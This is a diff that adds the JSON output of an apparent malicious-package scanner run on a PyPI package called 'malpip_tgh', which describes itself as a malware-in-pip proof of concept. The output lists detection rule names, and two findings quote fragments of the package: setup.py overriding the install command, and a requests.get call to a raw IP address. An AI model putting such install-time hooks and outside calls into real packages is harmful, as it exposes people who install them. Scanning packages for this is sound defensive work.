@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:21",
+                "code": "setuptools.setup(\n    name = \"malpip_tgh\",\n    version = \"1.0.71\",\n    author = \"TheGoodHacker\",\n    author_email = \"thegoodhackertv@gmail.com\",\n    description = \"Malware in pip package PoC by TheGoodHacker\",\n    long_description = \"long d...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:10",
+                "code": "    requests.get(\"http://194.233.164.169/holaa\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/malpip_tgh-1.0.71"
+}
